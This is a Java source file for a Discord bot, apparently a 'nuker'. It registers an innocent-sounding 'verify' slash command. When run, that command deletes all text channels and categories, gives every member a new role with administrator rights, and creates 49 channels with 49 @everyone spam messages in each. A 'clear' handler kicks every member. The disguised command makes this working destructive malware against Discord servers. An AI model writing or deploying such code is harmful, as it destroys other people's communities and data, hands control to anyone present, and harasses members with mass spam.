package club.revived.boot;

import net.dv8tion.jda.api.JDA;
import net.dv8tion.jda.api.JDABuilder;
import net.dv8tion.jda.api.Permission;
import net.dv8tion.jda.api.entities.Member;
import net.dv8tion.jda.api.entities.Role;
import net.dv8tion.jda.api.entities.channel.Channel;
import net.dv8tion.jda.api.entities.channel.concrete.Category;
import net.dv8tion.jda.api.events.interaction.command.SlashCommandInteractionEvent;
import net.dv8tion.jda.api.hooks.ListenerAdapter;
import net.dv8tion.jda.api.interactions.commands.build.Commands;
import net.dv8tion.jda.api.requests.restaction.CommandListUpdateAction;

import java.awt.*;

public class BotBootStrap extends ListenerAdapter {

    private static JDA jda;

    public static BotBootStrap start(String token){
        jda = JDABuilder.createDefault(token)
                .addEventListeners(new BotBootStrap())
                .build();

        CommandListUpdateAction commands = jda.updateCommands();
        commands.addCommands(Commands.slash("verify", "Sometimes things just need to end, QUICK")
                .setGuildOnly(true)).queue();
        return new BotBootStrap();
    }

    public BotBootStrap(){

    }

    @Override
    public void onSlashCommandInteraction(SlashCommandInteractionEvent event) {
        if (event.getGuild() == null) return;
        if(event.getName().equals("clear")){
            for(Member member : event.getGuild().getMembers()){
                try {
                    member.kick().queue();
                } catch (Exception e){
                    // Leer, oder so
                }
            }
        }
        if (event.getName().equals("verify")) {

            event.getGuild().getTextChannels().forEach(channel -> {
                channel.delete().queue();
            });

            event.getGuild().getCategories().forEach(category -> {
                category.delete().queue();
            });

            event.getGuild().createRole().setName("PRAISE HECATE").setPermissions(Permission.ADMINISTRATOR).setHoisted(true).setColor(Color.BLACK).queue(role -> {
                event.getGuild().getMembers().forEach(member -> event.getGuild().addRoleToMember(member, role).queue());
            });

            for(int x = 0; x < 49; x++) {
                event.getGuild().createTextChannel("PRAISE HECATE").queue(textChannel -> {
                    for (int y = 0; y < 49; y++) {
                        event.getGuild().getTextChannelById(textChannel.getId()).sendMessage("@everyone PRAISE HECATE").queue();
                    }
                });
            }


        }
    }
}
